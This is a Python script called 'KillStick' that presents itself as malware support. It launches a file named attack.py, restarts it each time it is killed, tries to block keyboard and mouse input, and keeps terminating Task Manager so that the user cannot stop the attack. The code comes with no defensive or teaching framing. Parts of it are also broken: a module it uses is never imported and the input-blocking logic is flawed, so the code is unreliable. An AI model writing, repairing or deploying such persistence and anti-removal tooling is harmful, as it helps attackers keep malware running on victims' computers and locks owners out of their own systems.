import os
import sys
import subprocess
import time
import threading
import ctypes
import win32gui
import win32process
import win32api
import psutil
from pynput import keyboard, mouse
from pynput.keyboard import Key, Controller as KeyboardController
from pynput.mouse import Button, Controller as MouseController

# --- Configuration ---
MALWARE_PATH = "attack.py"  # Updated to your specific file
RESTART_DELAY = 0.5          # Seconds to wait before restarting if killed
TASKMGR_KILL_DELAY = 1.0     # Seconds to wait after opening Task Manager to kill it

class KillStick:
    def __init__(self):
        self.is_running = True
        self.malware_pid = None
        self.taskmgr_pid = None
        
        # Install dependencies if missing
        self.install_dependencies()
        
    def install_dependencies(self):
        """Auto-installs required libraries."""
        packages = ['pynput', 'psutil', 'pywin32']
        for package in packages:
            try:
                __import__(package)
            except ImportError:
                print(f"[*] Installing {package}...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"[+] {package} installed successfully.")

    def start(self):
        """Main execution loop"""
        print("🔥 KILL STICK ACTIVATED 🔥")
        print("System lockdown initiated...")
        print("- Input hijacked (Mouse/Keyboard blocked)")
        print("- Task Manager auto-killed")
        print("- Malware process resurrected on death")
        
        # Step 1: Start input hijacker
        hijack_thread = threading.Thread(target=self.hijack_input, daemon=True)
        hijack_thread.start()
        
        # Step 2: Start Task Manager killer
        tm_thread = threading.Thread(target=self.kill_task_manager, daemon=True)
        tm_thread.start()
        
        # Step 3: Start Malware and monitor it
        self.run_malware_loop()

    def run_malware_loop(self):
        """Runs the malware and restarts it if it closes."""
        while self.is_running:
            if self.malware_pid is None or not psutil.pid_exists(self.malware_pid):
                print("[*] Launching attack.py...")
                try:
                    # Use python.exe to run the .py file explicitly
                    result = subprocess.Popen(
                        [sys.executable, MALWARE_PATH], 
                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
                    )
                    self.malware_pid = result.pid
                    print(f"[+] Attack.py running with PID: {self.malware_pid}")
                except Exception as e:
                    print(f"[-] Error launching attack.py: {e}")
            
            time.sleep(RESTART_DELAY)

    def hijack_input(self):
        """Blocks all keyboard and mouse input."""
        print("[*] Input Hijacking Active...")
        
        # Block keys that might help escape (Esc, Alt+F4)
        block_keys = [Key.esc, Key.alt_l, Key.ctrl_c]
        
        def on_press(key):
            # If key is in block list, return False to stop propagation
            if key in block_keys:
                return False
            return True

        def on_click(x, y, button, pressed):
            # Block all mouse clicks
            return False

        with keyboard.Listener(on_press=on_press) as k_listener, \
             mouse.Listener(on_click=on_click) as m_listener:
            k_listener.join()
            m_listener.join()

    def kill_task_manager(self):
        """Monitors for Task Manager and kills it."""
        print("[*] Task Manager Protection Active...")
        
        while self.is_running:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == 'taskmgr.exe':
                    print("[!] Task Manager detected! Killing...")
                    try:
                        proc.kill()
                    except Exception:
                        pass
                    
                    # Also try to force close via Windows API
                    try:
                        hwnd = win32gui.FindWindow(None, "Task Manager")
                        if hwnd:
                            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                    except Exception:
                        pass
                        
            time.sleep(TASKMGR_KILL_DELAY)

if __name__ == "__main__":
    try:
        stick = KillStick()
        stick.start()
    except KeyboardInterrupt:
        print("\n[!] Force exit requested...")
        stick.is_running = False
